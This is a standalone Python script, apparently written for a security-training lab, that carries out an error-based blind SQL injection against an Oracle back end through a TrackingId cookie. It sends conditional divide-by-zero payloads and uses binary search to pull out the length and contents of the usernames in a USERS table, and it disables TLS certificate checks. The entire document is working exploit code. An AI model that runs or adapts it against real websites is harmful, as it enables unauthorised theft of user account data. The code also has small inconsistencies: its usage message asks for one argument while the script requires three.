import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url = sys.argv[1]

def request(sqli_payload):
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'VwY3ojTOyj426D5Q' + sqli_payload_encoded, 'session': 'HxqSXJZQxSZgzyn4n0UpnNhH61vpfMdY'}
    r = requests.get(url, cookies=cookies, verify=False)
    return r

def userName_len(i, j):
    for x in range(i,j):
        sqli_payload = "'||(SELECT CASE WHEN ((SELECT length(''||LISTAGG(username,',') within group (order by username)) as name FROM USERS) = %s) THEN TO_CHAR(0/1) ELSE TO_CHAR(1/0) END FROM dual)||'" % (x)
        r = request(sqli_payload)
        if r.status_code == 200:
            print("\nlength username is: ", x)
            return x
        else:
            sys.stdout.write('\r' + str(x))

def userName(a,b):
    l = userName_len (a, b)
    data = ""
    print("Table name: ")
    for i in range (1,l+1):
        c = 32
        d = 126
        while True:
            x = int((c+d)/2)
            sqli_payload = "'||(SELECT CASE WHEN((SELECT ascii(substr((''||LISTAGG(username,',') within group (order by username)),%s,1)) as name FROM USERS) = '%s') THEN TO_CHAR(0/1) ELSE TO_CHAR(1/0) END FROM dual)||'" % (i,x) 
            r = request(sqli_payload)
            sp = "'||(SELECT CASE WHEN((SELECT ascii(substr((''||LISTAGG(username,',') within group (order by username)),%s,1)) as name FROM USERS) > '%s') THEN TO_CHAR(0/1) ELSE TO_CHAR(1/0) END FROM dual)||'" % (i,x) 
            r1 = request(sp)
            if r.status_code == 200:
                data += chr(x)
                print("\n",data)
                break
            else:
                sys.stdout.write('\r' + chr(x))
            if r1.status_code == 200:
                c = x
            else:
                d = x
def main():
    if len(sys.argv) !=4:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    a = int(sys.argv[2])
    b = int(sys.argv[3])
    userName(a ,b)


if __name__ == "__main__":
    main()